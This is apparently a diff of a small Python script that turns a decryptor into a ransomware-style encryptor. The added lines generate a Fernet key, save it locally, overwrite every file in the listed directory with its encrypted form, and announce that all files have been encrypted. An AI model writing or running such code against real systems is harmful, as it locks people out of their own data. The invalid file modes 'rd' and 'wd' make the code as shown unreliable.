@@ -15,16 +15,18 @@ for file in os.listdir():
 
 print(files)
 
-with open("thekey.key", "rd") as thekey:
-	key = thekey.read
+key = Fernet.generate_key()
+
+with open("thekey.key", "wd") as thekey:
+	thekey.write(key)
 
 
 for file in files:
 	with open(file, "rb") as thefile:
 		contents = thefile.read()
-	contents_decrypted = Fernet(key).decrypt(contents)
+	contents_encrypted = Fernet(key).encrypt(contents)
 	with open(file, "wb") as thefile:
-		thefile.write(contents_decrypted) 
+		thefile.write(contents_encrypted) 
 
 
-print("All of your files had been decrypted!")
+print("All of your files had been encrypted!")
